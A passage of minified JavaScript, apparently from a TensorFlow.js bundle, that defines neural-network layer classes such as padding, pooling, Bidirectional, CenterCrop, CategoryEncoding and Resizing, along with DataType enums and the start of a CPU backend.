                if ("number" == typeof t.padding[0])
                    e = [t.padding[0], t.padding[0]],
                    s = [t.padding[1], t.padding[1]];
                else {
                    if (t.padding = t.padding,
                    2 !== t.padding[0].length)
                        throw new $(`ZeroPadding2D expects height padding to be a length-2 array, but received a length-${t.padding[0].length} array.`);
                    if (e = t.padding[0],
                    2 !== t.padding[1].length)
                        throw new $(`ZeroPadding2D expects width padding to be a length-2 array, but received a length-${t.padding[1].length} array.`);
                    s = t.padding[1]
                }
                this.padding = [e, s]
            }
            this.inputSpec = [new ue({
                ndim: 4
            })]
        }
        computeOutputShape(t) {
            let e, s;
            return t = Nt(t),
            "channelsFirst" === this.dataFormat ? (e = null != t[2] && t[2] >= 0 ? t[2] + this.padding[0][0] + this.padding[0][1] : null,
            s = null != t[3] && t[3] >= 0 ? t[3] + this.padding[1][0] + this.padding[1][1] : null,
            [t[0], t[1], e, s]) : (e = null != t[1] && t[1] >= 0 ? t[1] + this.padding[0][0] + this.padding[0][1] : null,
            s = null != t[2] && t[2] >= 0 ? t[2] + this.padding[1][0] + this.padding[1][1] : null,
            [t[0], e, s, t[3]])
        }
        call(t, e) {
            return M((()=>function vG(n, t, e) {
                return M((()=>{
                    if (4 !== n.rank)
                        throw new $(`temporalPadding expects input tensor to be 4-D, but received a ${n.rank}-D tensor.`);
                    if (null == t && (t = [[1, 1], [1, 1]]),
                    2 !== t.length || 2 !== t[0].length || 2 !== t[1].length)
                        throw new $("spatial2dPadding expects `padding` to be an Array of two Arrays, each of which is an Array of two integers.");
                    if (null == e && (e = "channelsLast"),
                    "channelsLast" !== e && "channelsFirst" !== e)
                        throw new $(`Unknown data format: ${e}. Supported data formats are 'channelsLast' and 'channelsFirst.`);
                    let s;
                    return s = "channelsFirst" === e ? [[0, 0], [0, 0], t[0], t[1]] : [[0, 0], t[0], t[1], [0, 0]],
                    Td(n, s)
                }
                ))
            }(mt(t), this.padding, this.dataFormat)))
        }
        getConfig() {
            const t = {
                padding: this.padding,
                dataFormat: this.dataFormat
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
    }
    function dl(n, t, e, s, o, r) {
        return M((()=>{
            let i;
            se(o),
            d0(r),
            rn(s),
            null == e && (e = [1, 1]),
            null == s && (s = "valid"),
            null == o && (o = "channelsLast"),
            null == r && (r = "max"),
            n = sp(n, o);
            const a = "same" === s ? "same" : "valid";
            return i = "max" === r ? Sd(n, t, e, a) : hd(n, t, e, a),
            "channelsFirst" === o && (i = kt(i, [0, 3, 1, 2])),
            i
        }
        ))
    }
    function px(n, t, e, s, o, r) {
        return M((()=>{
            let i;
            se(o),
            d0(r),
            rn(s),
            null == e && (e = [1, 1, 1]),
            null == s && (s = "valid"),
            null == o && (o = "channelsLast"),
            null == r && (r = "max"),
            n = $b(n, o);
            const a = "same" === s ? "same" : "valid";
            return i = "max" === r ? Pv(n, t, e, a) : OC(n, t, e, a),
            "channelsFirst" === o && (i = kt(i, [0, 4, 1, 2, 3])),
            i
        }
        ))
    }
    hx.className = "ZeroPadding2D",
    _(hx);
    class fx extends Ct {
        constructor(t) {
            if (null == t.poolSize && (t.poolSize = 2),
            super(t),
            "number" == typeof t.poolSize)
                this.poolSize = [t.poolSize];
            else {
                if (!Array.isArray(t.poolSize) || 1 !== t.poolSize.length || "number" != typeof t.poolSize[0])
                    throw new $(`poolSize for 1D convolutional layer must be a number or an Array of a single number, but received ${JSON.stringify(t.poolSize)}`);
                this.poolSize = t.poolSize
            }
            if (be(this.poolSize, "poolSize"),
            null == t.strides)
                this.strides = this.poolSize;
            else if ("number" == typeof t.strides)
                this.strides = [t.strides];
            else {
                if (!Array.isArray(t.strides) || 1 !== t.strides.length || "number" != typeof t.strides[0])
                    throw new $(`strides for 1D convolutional layer must be a number or an Array of a single number, but received ${JSON.stringify(t.strides)}`);
                this.strides = t.strides
            }
            be(this.strides, "strides"),
            this.padding = null == t.padding ? "valid" : t.padding,
            rn(this.padding),
            this.inputSpec = [new ue({
                ndim: 3
            })]
        }
        computeOutputShape(t) {
            const e = Wn((t = Nt(t))[1], this.poolSize[0], this.padding, this.strides[0]);
            return [t[0], e, t[2]]
        }
        call(t, e) {
            return M((()=>{
                this.invokeCallHook(t, e),
                t = Ai(mt(t), 2);
                const s = this.poolingFunction(mt(t), [this.poolSize[0], 1], [this.strides[0], 1], this.padding, "channelsLast");
                return Di(s, [2])
            }
            ))
        }
        getConfig() {
            const t = {
                poolSize: this.poolSize,
                padding: this.padding,
                strides: this.strides
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
    }
    class mx extends fx {
        constructor(t) {
            super(t)
        }
        poolingFunction(t, e, s, o, r) {
            return se(r),
            rn(o),
            dl(t, e, s, o, r, "max")
        }
    }
    mx.className = "MaxPooling1D",
    _(mx);
    class gx extends fx {
        constructor(t) {
            super(t)
        }
        poolingFunction(t, e, s, o, r) {
            return se(r),
            rn(o),
            dl(t, e, s, o, r, "avg")
        }
    }
    gx.className = "AveragePooling1D",
    _(gx);
    class bx extends Ct {
        constructor(t) {
            if (null == t.poolSize && (t.poolSize = [2, 2]),
            super(t),
            this.poolSize = Array.isArray(t.poolSize) ? t.poolSize : [t.poolSize, t.poolSize],
            null == t.strides)
                this.strides = this.poolSize;
            else if (Array.isArray(t.strides)) {
                if (2 !== t.strides.length)
                    throw new $(`If the strides property of a 2D pooling layer is an Array, it is expected to have a length of 2, but received length ${t.strides.length}.`);
                this.strides = t.strides
            } else
                this.strides = [t.strides, t.strides];
            be(this.poolSize, "poolSize"),
            be(this.strides, "strides"),
            this.padding = null == t.padding ? "valid" : t.padding,
            this.dataFormat = null == t.dataFormat ? "channelsLast" : t.dataFormat,
            se(this.dataFormat),
            rn(this.padding),
            this.inputSpec = [new ue({
                ndim: 4
            })]
        }
        computeOutputShape(t) {
            t = Nt(t);
            let e = "channelsFirst" === this.dataFormat ? t[2] : t[1]
              , s = "channelsFirst" === this.dataFormat ? t[3] : t[2];
            return e = Wn(e, this.poolSize[0], this.padding, this.strides[0]),
            s = Wn(s, this.poolSize[1], this.padding, this.strides[1]),
            "channelsFirst" === this.dataFormat ? [t[0], t[1], e, s] : [t[0], e, s, t[3]]
        }
        call(t, e) {
            return M((()=>(this.invokeCallHook(t, e),
            this.poolingFunction(mt(t), this.poolSize, this.strides, this.padding, this.dataFormat))))
        }
        getConfig() {
            const t = {
                poolSize: this.poolSize,
                padding: this.padding,
                strides: this.strides,
                dataFormat: this.dataFormat
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
    }
    class xx extends bx {
        constructor(t) {
            super(t)
        }
        poolingFunction(t, e, s, o, r) {
            return se(r),
            rn(o),
            dl(t, e, s, o, r, "max")
        }
    }
    xx.className = "MaxPooling2D",
    _(xx);
    class yx extends bx {
        constructor(t) {
            super(t)
        }
        poolingFunction(t, e, s, o, r) {
            return se(r),
            rn(o),
            dl(t, e, s, o, r, "avg")
        }
    }
    yx.className = "AveragePooling2D",
    _(yx);
    class Ix extends Ct {
        constructor(t) {
            if (null == t.poolSize && (t.poolSize = [2, 2, 2]),
            super(t),
            this.poolSize = Array.isArray(t.poolSize) ? t.poolSize : [t.poolSize, t.poolSize, t.poolSize],
            null == t.strides)
                this.strides = this.poolSize;
            else if (Array.isArray(t.strides)) {
                if (3 !== t.strides.length)
                    throw new $(`If the strides property of a 3D pooling layer is an Array, it is expected to have a length of 3, but received length ${t.strides.length}.`);
                this.strides = t.strides
            } else
                this.strides = [t.strides, t.strides, t.strides];
            be(this.poolSize, "poolSize"),
            be(this.strides, "strides"),
            this.padding = null == t.padding ? "valid" : t.padding,
            this.dataFormat = null == t.dataFormat ? "channelsLast" : t.dataFormat,
            se(this.dataFormat),
            rn(this.padding),
            this.inputSpec = [new ue({
                ndim: 5
            })]
        }
        computeOutputShape(t) {
            t = Nt(t);
            let e = "channelsFirst" === this.dataFormat ? t[2] : t[1]
              , s = "channelsFirst" === this.dataFormat ? t[3] : t[2]
              , o = "channelsFirst" === this.dataFormat ? t[4] : t[3];
            return e = Wn(e, this.poolSize[0], this.padding, this.strides[0]),
            s = Wn(s, this.poolSize[1], this.padding, this.strides[1]),
            o = Wn(o, this.poolSize[2], this.padding, this.strides[2]),
            "channelsFirst" === this.dataFormat ? [t[0], t[1], e, s, o] : [t[0], e, s, o, t[4]]
        }
        call(t, e) {
            return M((()=>(this.invokeCallHook(t, e),
            this.poolingFunction(mt(t), this.poolSize, this.strides, this.padding, this.dataFormat))))
        }
        getConfig() {
            const t = {
                poolSize: this.poolSize,
                padding: this.padding,
                strides: this.strides,
                dataFormat: this.dataFormat
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
    }
    class wx extends Ix {
        constructor(t) {
            super(t)
        }
        poolingFunction(t, e, s, o, r) {
            return se(r),
            rn(o),
            px(t, e, s, o, r, "max")
        }
    }
    wx.className = "MaxPooling3D",
    _(wx);
    class Cx extends Ix {
        constructor(t) {
            super(t)
        }
        poolingFunction(t, e, s, o, r) {
            return se(r),
            rn(o),
            px(t, e, s, o, r, "avg")
        }
    }
    Cx.className = "AveragePooling3D",
    _(Cx);
    class vx extends Ct {
        constructor(t) {
            super(t),
            this.inputSpec = [new ue({
                ndim: 3
            })]
        }
        computeOutputShape(t) {
            return [t[0], t[2]]
        }
        call(t, e) {
            throw new bt
        }
    }
    class Sx extends vx {
        constructor(t) {
            super(t || {})
        }
        call(t, e) {
            return M((()=>{
                const s = mt(t);
                return ie(s, 1)
            }
            ))
        }
    }
    Sx.className = "GlobalAveragePooling1D",
    _(Sx);
    class kx extends vx {
        constructor(t) {
            super(t || {})
        }
        call(t, e) {
            return M((()=>{
                const s = mt(t);
                return Tn(s, 1)
            }
            ))
        }
    }
    kx.className = "GlobalMaxPooling1D",
    _(kx);
    class Tx extends Ct {
        constructor(t) {
            super(t),
            this.dataFormat = null == t.dataFormat ? "channelsLast" : t.dataFormat,
            se(this.dataFormat),
            this.inputSpec = [new ue({
                ndim: 4
            })]
        }
        computeOutputShape(t) {
            return "channelsLast" === this.dataFormat ? [t[0], t[3]] : [t[0], t[1]]
        }
        call(t, e) {
            throw new bt
        }
        getConfig() {
            const t = {
                dataFormat: this.dataFormat
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
    }
    class Nx extends Tx {
        call(t, e) {
            return M((()=>{
                const s = mt(t);
                return "channelsLast" === this.dataFormat ? ie(s, [1, 2]) : ie(s, [2, 3])
            }
            ))
        }
    }
    Nx.className = "GlobalAveragePooling2D",
    _(Nx);
    class Rx extends Tx {
        call(t, e) {
            return M((()=>{
                const s = mt(t);
                return "channelsLast" === this.dataFormat ? Tn(s, [1, 2]) : Tn(s, [2, 3])
            }
            ))
        }
    }
    Rx.className = "GlobalMaxPooling2D",
    _(Rx);
    class $x extends Ct {
        constructor(t) {
            super(t),
            this.layer = t.layer
        }
        build(t) {
            this.built = !0
        }
        get trainable() {
            return null != this.layer && this.layer.trainable
        }
        set trainable(t) {
            null != this.layer && (this.layer.trainable = t)
        }
        get trainableWeights() {
            return this.layer.trainableWeights
        }
        get nonTrainableWeights() {
            return this.layer.nonTrainableWeights
        }
        get updates() {
            return this.layer._updates
        }
        get losses() {
            return this.layer.losses
        }
        getWeights() {
            return this.layer.getWeights()
        }
        setWeights(t) {
            this.layer.setWeights(t)
        }
        getConfig() {
            const t = {
                layer: {
                    className: this.layer.getClassName(),
                    config: this.layer.getConfig()
                }
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
        setFastWeightInitDuringBuild(t) {
            super.setFastWeightInitDuringBuild(t),
            null != this.layer && this.layer.setFastWeightInitDuringBuild(t)
        }
        static fromConfig(t, e, s={}) {
            const r = us(e.layer, s);
            delete e.layer;
            const i = {
                layer: r
            };
            return Object.assign(i, e),
            new t(i)
        }
    }
    class Gx extends $x {
        constructor(t) {
            super(t),
            this.supportsMasking = !0
        }
        build(t) {
            if ((t = Nt(t)).length < 3)
                throw new $(`TimeDistributed layer expects an input shape >= 3D, but received input shape ${JSON.stringify(t)}`);
            this.inputSpec = [{
                shape: t
            }];
            const e = [t[0]].concat(t.slice(2));
            this.layer.built || (this.layer.build(e),
            this.layer.built = !0),
            super.build(t)
        }
        computeOutputShape(t) {
            const e = [(t = Nt(t))[0]].concat(t.slice(2))
              , s = this.layer.computeOutputShape(e)
              , o = t[1];
            return [s[0], o].concat(s.slice(1))
        }
        call(t, e) {
            return M((()=>Xb(((i,a)=>[mt(this.layer.call(i, e)), []]), t = mt(t), [], !1, null, null, !1, !0)[1]))
        }
    }
    Gx.className = "TimeDistributed",
    _(Gx);
    class Lx extends $x {
        constructor(t) {
            super(t);
            const e = t.layer.getConfig()
              , s = {};
            s.className = t.layer.getClassName(),
            s.config = e,
            this.forwardLayer = us(s),
            e.goBackwards = !0 !== e.goBackwards;
            const o = {};
            if (o.className = t.layer.getClassName(),
            o.config = e,
            this.backwardLayer = us(o),
            this.forwardLayer.name = "forward_" + this.forwardLayer.name,
            this.backwardLayer.name = "backward_" + this.backwardLayer.name,
            this.mergeMode = void 0 === t.mergeMode ? "concat" : t.mergeMode,
            function SG(n) {
                fo(HR, "BidirectionalMergeMode", n)
            }(this.mergeMode),
            t.weights)
                throw new bt("weights support is not implemented for Bidirectional layer yet.");
            this._stateful = t.layer.stateful,
            this.returnSequences = t.layer.returnSequences,
            this.returnState = t.layer.returnState,
            this.supportsMasking = !0,
            this._trainable = !0,
            this.inputSpec = t.layer.inputSpec,
            this.numConstants = null
        }
        get trainable() {
            return this._trainable
        }
        set trainable(t) {
            this._trainable = t,
            null != this.forwardLayer && (this.forwardLayer.trainable = t),
            null != this.backwardLayer && (this.backwardLayer.trainable = t)
        }
        getWeights() {
            return this.forwardLayer.getWeights().concat(this.backwardLayer.getWeights())
        }
        setWeights(t) {
            const e = t.length
              , s = Math.floor(e / 2);
            this.forwardLayer.setWeights(t.slice(0, s)),
            this.backwardLayer.setWeights(t.slice(s))
        }
        computeOutputShape(t) {
            let s, o, r, e = this.forwardLayer.computeOutputShape(t);
            return Array.isArray(e) && Array.isArray(e[0]) || (e = [e]),
            this.returnState && (r = e.slice(1)),
            s = e[0],
            "concat" === this.mergeMode ? (s[s.length - 1] *= 2,
            o = [s]) : o = null == this.mergeMode ? [s, s.slice()] : [s],
            this.returnState ? null == this.mergeMode ? o.concat(r).concat(r.slice()) : [s].concat(r).concat(r.slice()) : Pe(o)
        }
        apply(t, e) {
            let s = null == e ? null : e.initialState
              , o = null == e ? null : e.constants;
            null == e && (e = {});
            const r = zb(t, s, o, this.numConstants);
            if (t = r.inputs,
            s = r.initialState,
            o = r.constants,
            Array.isArray(t) && (s = t.slice(1),
            t = t[0]),
            (null == s || 0 === s.length) && null == o)
                return super.apply(t, e);
            const i = []
              , a = [];
            if (null != s) {
                const l = s.length;
                if (l % 2 > 0)
                    throw new $("When passing `initialState` to a Bidrectional RNN, the state should be an Array containing the states of the underlying RNNs.");
                e.initialState = s,
                i.push(...s);
                const u = s.map((d=>new ue({
                    shape: d.shape
                })));
                this.forwardLayer.stateSpec = u.slice(0, l / 2),
                this.backwardLayer.stateSpec = u.slice(l / 2),
                a.push(...u)
            }
            if (null != o)
                throw new bt("Support for constants in Bidirectional layers is not implemented yet.");
            const c = i[0]instanceof Un;
            for (const l of i)
                if (l instanceof Un !== c)
                    throw new $("The initial state of a Bidirectional layer cannot be specified as a mix of symbolic and non-symbolic tensors");
            if (c) {
                const l = [t].concat(i)
                  , u = this.inputSpec.concat(a)
                  , d = this.inputSpec;
                this.inputSpec = u;
                const h = super.apply(l, e);
                return this.inputSpec = d,
                h
            }
            return super.apply(t, e)
        }
        call(t, e) {
            return M((()=>{
                const s = e.initialState;
                let o, r, i, a;
                if (null == s)
                    o = this.forwardLayer.call(t, e),
                    r = this.backwardLayer.call(t, e);
                else {
                    const c = s.slice(0, s.length / 2)
                      , l = s.slice(s.length / 2);
                    o = this.forwardLayer.call(t, Object.assign(e, {
                        initialState: c
                    })),
                    r = this.backwardLayer.call(t, Object.assign(e, {
                        initialState: l
                    }))
                }
                return this.returnState && (Array.isArray(o) && (i = o.slice(1).concat(r.slice(1))),
                o = o[0],
                r = r[0]),
                this.returnSequences && (r = ao(r, 1)),
                "concat" === this.mergeMode ? a = Lh([o, r]) : "sum" === this.mergeMode ? a = Q(o, r) : "ave" === this.mergeMode ? a = E(.5, Q(o, r)) : "mul" === this.mergeMode ? a = E(o, r) : null == this.mergeMode && (a = [o, r]),
                this.returnState ? null == this.mergeMode ? a.concat(i) : [a].concat(i) : a
            }
            ))
        }
        resetStates(t) {
            this.forwardLayer.resetStates(),
            this.backwardLayer.resetStates()
        }
        build(t) {
            mo(this.forwardLayer.name, (()=>{
                this.forwardLayer.build(t)
            }
            )),
            mo(this.backwardLayer.name, (()=>{
                this.backwardLayer.build(t)
            }
            )),
            this.built = !0
        }
        computeMask(t, e) {
            let s;
            if (Array.isArray(e) && (e = e[0]),
            s = this.returnSequences ? null == this.mergeMode ? [e, e] : e : null == this.mergeMode ? [null, null] : null,
            this.returnState) {
                const r = this.forwardLayer.states.map((i=>null));
                return Array.isArray(s) ? s.concat(r).concat(r) : [s].concat(r).concat(r)
            }
            return s
        }
        get trainableWeights() {
            return this.forwardLayer.trainableWeights.concat(this.backwardLayer.trainableWeights)
        }
        get nonTrainableWeights() {
            return this.forwardLayer.nonTrainableWeights.concat(this.backwardLayer.nonTrainableWeights)
        }
        setFastWeightInitDuringBuild(t) {
            super.setFastWeightInitDuringBuild(t),
            null != this.forwardLayer && this.forwardLayer.setFastWeightInitDuringBuild(t),
            null != this.backwardLayer && this.backwardLayer.setFastWeightInitDuringBuild(t)
        }
        getConfig() {
            const t = {
                mergeMode: this.mergeMode
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
        static fromConfig(t, e) {
            const s = us(e.layer);
            if (delete e.layer,
            null != e.numConstants)
                throw new bt("Deserialization of a Bidirectional layer with numConstants present is not supported yet.");
            const o = e;
            return o.layer = s,
            new t(o)
        }
    }
    Lx.className = "Bidirectional",
    _(Lx);
    class Ex extends Ct {
        constructor(t) {
            super(t),
            this.scale = t.scale,
            t.offset ? this.offset = t.offset : this.offset = 0
        }
        getConfig() {
            const t = {
                scale: this.scale,
                offset: this.offset
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
        call(t, e) {
            return M((()=>("float32" !== (t = mt(t)).dtype && (t = Hn(t, "float32")),
            Q(E(t, this.scale), this.offset))))
        }
    }
    Ex.className = "Rescaling",
    _(Ex);
    const {resizeBilinear: TG, cropAndResize: NG} = is;
    class Dx extends Ct {
        constructor(t) {
            super(t),
            this.height = t.height,
            this.width = t.width
        }
        centerCrop(t, e, s, o, r, i, a, c) {
            return M((()=>{
                let l, u = !1;
                const m = [e / i, s / a, (o + e) / i, (r + s) / a]
                  , g = [];
                3 === t.rank ? (u = !0,
                l = On([t])) : l = t;
                for (let w = 0; w < l.shape[0]; w++)
                    g.push(m);
                const b = tn(g, [g.length, 4])
                  , x = Ei(0, g.length, 1, "int32")
                  , y = NG(l, b, x, [o, r], "nearest");
                return Hn(u ? mt(lo(y)) : y, c)
            }
            ))
        }
        upsize(t, e, s, o) {
            return M((()=>Hn(TG(t, [e, s]), o)))
        }
        call(t, e) {
            return M((()=>{
                const s = mt(t)
                  , o = s.dtype
                  , r = s.shape
                  , i = r[r.length - 3]
                  , a = r[r.length - 2];
                let c = 0;
                i !== this.height && (c = Math.floor((i - this.height) / 2));
                let l = 0;
                return a !== this.width && (l = Math.floor((a - this.width) / 2),
                0 === l && (l = 1)),
                c >= 0 && l >= 0 ? this.centerCrop(s, c, l, this.height, this.width, i, a, o) : this.upsize(t, this.height, this.width, o)
            }
            ))
        }
        getConfig() {
            const t = {
                height: this.height,
                width: this.width
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
        computeOutputShape(t) {
            const e = (t = Nt(t)).length - 3
              , s = t.length - 2;
            return t[e] = this.height,
            t[s] = this.width,
            t
        }
    }
    Dx.className = "CenterCrop",
    _(Dx);
    class Wx extends Ct {
        constructor(t) {
            super(t),
            this.numTokens = t.numTokens,
            t.outputMode ? this.outputMode = t.outputMode : this.outputMode = "multiHot"
        }
        getConfig() {
            const t = {
                numTokens: this.numTokens,
                outputMode: this.outputMode
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
        computeOutputShape(t) {
            return null == (t = Nt(t)) ? [this.numTokens] : "oneHot" === this.outputMode && 1 !== t[t.length - 1] ? (t.push(this.numTokens),
            t) : (t[t.length - 1] = this.numTokens,
            t)
        }
        call(t, e) {
            return M((()=>{
                let s;
                if ("int32" !== (t = mt(t)).dtype && (t = Hn(t, "int32")),
                typeof e.countWeights < "u") {
                    if ("count" !== this.outputMode)
                        throw new $(`countWeights is not used when outputMode !== count.\n              Received countWeights=${e.countWeights}`);
                    s = mt(e.countWeights)
                }
                const o = Tn(t)
                  , r = Lc(t)
                  , i = sn(this.numTokens, o).bufferSync().get(0)
                  , a = oo(r, 0).bufferSync().get(0);
                if (!i || !a)
                    throw new $(`Input values must be between 0 < values <= numTokens with numTokens=${this.numTokens}`);
                return function RG(n, t, e, s) {
                    let o = mt(n);
                    if ("int32" !== o.dtype && (o = Hn(o, "int32")),
                    "int" === t)
                        return o;
                    const r = o.shape;
                    if (0 === o.rank && (o = Ae(o, -1)),
                    "oneHot" === t && 1 !== o.shape[o.shape.length - 1] && (o = Ae(o, -1)),
                    o.rank > 2)
                        throw new $(`When outputMode is not int, maximum output rank is 2 Received outputMode ${t} and input shape ${r} which would result in output rank ${o.rank}.`);
                    const i = ["multiHot", "oneHot"].includes(t)
                      , a = o;
                    let c;
                    if (c = Vm(a, typeof s < "u" && "count" === t ? s : [], e, i),
                    "tfIdf" !== t)
                        return c;
                    if (s)
                        return E(c, s);
                    throw new $("When outputMode is 'tfIdf', weights must be provided.")
                }(t, this.outputMode, this.numTokens, s)
            }
            ))
        }
    }
    Wx.className = "CategoryEncoding",
    _(Wx);
    const Mx = new Set(["bilinear", "nearest"]);
    class Vx extends Ct {
        constructor(t) {
            if (super(t),
            this.height = t.height,
            this.width = t.width,
            t.interpolation) {
                if (!Mx.has(t.interpolation))
                    throw new $(`Invalid interpolation parameter: ${t.interpolation} is not implemented`);
                this.interpolation = t.interpolation
            } else
                this.interpolation = "bilinear";
            this.cropToAspectRatio = !!t.cropToAspectRatio
        }
        computeOutputShape(t) {
            const e = (t = Nt(t))[2];
            return [this.height, this.width, e]
        }
        getConfig() {
            const t = {
                height: this.height,
                width: this.width,
                interpolation: this.interpolation,
                cropToAspectRatio: this.cropToAspectRatio
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
        call(t, e) {
            return M((()=>{
                const s = [this.height, this.width];
                if ("bilinear" === this.interpolation)
                    return is.resizeBilinear(t, s, !this.cropToAspectRatio);
                if ("nearest" === this.interpolation)
                    return is.resizeNearestNeighbor(t, s, !this.cropToAspectRatio);
                throw new Error(`Interpolation is ${this.interpolation} but only ${[...Mx]} are supported`)
            }
            ))
        }
    }
    Vx.className = "Resizing",
    _(Vx);
    class Fx {
        constructor(t) {
            this.seed = t
        }
        next() {
            if (void 0 !== this.seed)
                return this.seed++
        }
    }
    Fx.className = "RandomSeed";
    class zx extends Ct {
        constructor(t) {
            super(t),
            this.randomGenerator = new Fx(t.seed)
        }
        getConfig() {
            const t = {
                seed: this.randomGenerator.seed
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
    }
    zx.className = "BaseRandomLayer";
    const Xx = new Set(["bilinear", "nearest"]);
    class Ax extends zx {
        constructor(t) {
            super(t);
            const {factor: e, interpolation: s="bilinear"} = t;
            if (this.factor = e,
            Array.isArray(this.factor) && 2 === this.factor.length)
                this.widthLower = this.factor[0],
                this.widthUpper = this.factor[1];
            else {
                if (Array.isArray(this.factor) || !(this.factor > 0))
                    throw new $(`Invalid factor: ${this.factor}. Must be positive number or tuple of 2 numbers`);
                this.widthLower = -this.factor,
                this.widthUpper = this.factor
            }
            if (this.widthLower < -1 || this.widthUpper < -1)
                throw new $(`factor must have values larger than -1. Got: ${this.factor}`);
            if (this.widthUpper < this.widthLower)
                throw new $(`factor cannot have upper bound less than lower bound.\n        Got upper bound: ${this.widthUpper}.\n        Got lower bound: ${this.widthLower}\n      `);
            if (s) {
                if (!Xx.has(s))
                    throw new $(`Invalid interpolation parameter: ${s} is not implemented`);
                this.interpolation = s
            }
        }
        getConfig() {
            const t = {
                factor: this.factor,
                interpolation: this.interpolation
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
        computeOutputShape(t) {
            const e = (t = Nt(t))[2];
            return [this.imgHeight, -1, e]
        }
        call(t, e) {
            return M((()=>{
                const s = mt(t);
                this.imgHeight = s.shape[s.shape.length - 3];
                const o = s.shape[s.shape.length - 2];
                this.widthFactor = Li([1], 1 + this.widthLower, 1 + this.widthUpper, "float32", this.randomGenerator.next());
                let r = this.widthFactor.dataSync()[0] * o;
                r = Math.round(r);
                const i = [this.imgHeight, r];
                switch (this.interpolation) {
                case "bilinear":
                    return is.resizeBilinear(t, i);
                case "nearest":
                    return is.resizeNearestNeighbor(t, i);
                default:
                    throw new Error(`Interpolation is ${this.interpolation}\n          but only ${[...Xx]} are supported`)
                }
            }
            ))
        }
    }
    var Px, Ox, Kx;
    function it(n, t) {
        Array.isArray(n) || (n = [n]),
        n.forEach((e=>{
            null != e && v("complex64" !== e.dtype, (()=>`${t} does not support complex64 tensors in the CPU backend.`))
        }
        ))
    }
    Ax.className = "RandomWidth",
    _(Ax),
    z().registerFlag("KEEP_INTERMEDIATE_TENSORS", (()=>!1), (n=>{
        n && console.warn("Keep intermediate tensors is ON. This will print the values of all intermediate tensors during model inference. Not all models support this mode. For details, check e2e/benchmarks/ model_config.js. This significantly impacts performance.")
    }
    )),
    function(n) {
        n[n.DT_INVALID = 0] = "DT_INVALID",
        n[n.DT_FLOAT = 1] = "DT_FLOAT",
        n[n.DT_DOUBLE = 2] = "DT_DOUBLE",
        n[n.DT_INT32 = 3] = "DT_INT32",
        n[n.DT_UINT8 = 4] = "DT_UINT8",
        n[n.DT_INT16 = 5] = "DT_INT16",
        n[n.DT_INT8 = 6] = "DT_INT8",
        n[n.DT_STRING = 7] = "DT_STRING",
        n[n.DT_COMPLEX64 = 8] = "DT_COMPLEX64",
        n[n.DT_INT64 = 9] = "DT_INT64",
        n[n.DT_BOOL = 10] = "DT_BOOL",
        n[n.DT_QINT8 = 11] = "DT_QINT8",
        n[n.DT_QUINT8 = 12] = "DT_QUINT8",
        n[n.DT_QINT32 = 13] = "DT_QINT32",
        n[n.DT_BFLOAT16 = 14] = "DT_BFLOAT16",
        n[n.DT_QINT16 = 15] = "DT_QINT16",
        n[n.DT_QUINT16 = 16] = "DT_QUINT16",
        n[n.DT_UINT16 = 17] = "DT_UINT16",
        n[n.DT_COMPLEX128 = 18] = "DT_COMPLEX128",
        n[n.DT_HALF = 19] = "DT_HALF",
        n[n.DT_RESOURCE = 20] = "DT_RESOURCE",
        n[n.DT_VARIANT = 21] = "DT_VARIANT",
        n[n.DT_UINT32 = 22] = "DT_UINT32",
        n[n.DT_UINT64 = 23] = "DT_UINT64",
        n[n.DT_FLOAT_REF = 101] = "DT_FLOAT_REF",
        n[n.DT_DOUBLE_REF = 102] = "DT_DOUBLE_REF",
        n[n.DT_INT32_REF = 103] = "DT_INT32_REF",
        n[n.DT_UINT8_REF = 104] = "DT_UINT8_REF",
        n[n.DT_INT16_REF = 105] = "DT_INT16_REF",
        n[n.DT_INT8_REF = 106] = "DT_INT8_REF",
        n[n.DT_STRING_REF = 107] = "DT_STRING_REF",
        n[n.DT_COMPLEX64_REF = 108] = "DT_COMPLEX64_REF",
        n[n.DT_INT64_REF = 109] = "DT_INT64_REF",
        n[n.DT_BOOL_REF = 110] = "DT_BOOL_REF",
        n[n.DT_QINT8_REF = 111] = "DT_QINT8_REF",
        n[n.DT_QUINT8_REF = 112] = "DT_QUINT8_REF",
        n[n.DT_QINT32_REF = 113] = "DT_QINT32_REF",
        n[n.DT_BFLOAT16_REF = 114] = "DT_BFLOAT16_REF",
        n[n.DT_QINT16_REF = 115] = "DT_QINT16_REF",
        n[n.DT_QUINT16_REF = 116] = "DT_QUINT16_REF",
        n[n.DT_UINT16_REF = 117] = "DT_UINT16_REF",
        n[n.DT_COMPLEX128_REF = 118] = "DT_COMPLEX128_REF",
        n[n.DT_HALF_REF = 119] = "DT_HALF_REF",
        n[n.DT_RESOURCE_REF = 120] = "DT_RESOURCE_REF",
        n[n.DT_VARIANT_REF = 121] = "DT_VARIANT_REF",
        n[n.DT_UINT32_REF = 122] = "DT_UINT32_REF",
        n[n.DT_UINT64_REF = 123] = "DT_UINT64_REF"
    }(Px || (Px = {})),
    function(n) {
        var t;
        (t = n.CheckpointFormatVersion || (n.CheckpointFormatVersion = {}))[t.LEGACY = 0] = "LEGACY",
        t[t.V1 = 1] = "V1",
        t[t.V2 = 2] = "V2"
    }(Ox || (Ox = {})),
    function(n) {
        n[n.FAIL = 0] = "FAIL",
        n[n.SHORTEST = 1] = "SHORTEST",
        n[n.LONGEST = 2] = "LONGEST"
    }(Kx || (Kx = {}));
    const LG = rg;
    class hl extends Zl {
        nextDataId() {
            return hl.nextDataId++
        }
        constructor() {
            super(),
            this.blockSize = 48,
            this.firstUse = !0,
            this.data = new lf(this,zt())
        }
        write(t, e, s) {
            this.firstUse && (this.firstUse = !1,
            z().get("IS_NODE") && je("\n============================\nHi, looks like you are running TensorFlow.js in Node.js. To speed things up dramatically, install our node backend, visit https://github.com/tensorflow/tfjs-node for more details. \n============================"));
            const o = {
                id: this.nextDataId()
            };
            return this.data.set(o, {
                values: t,
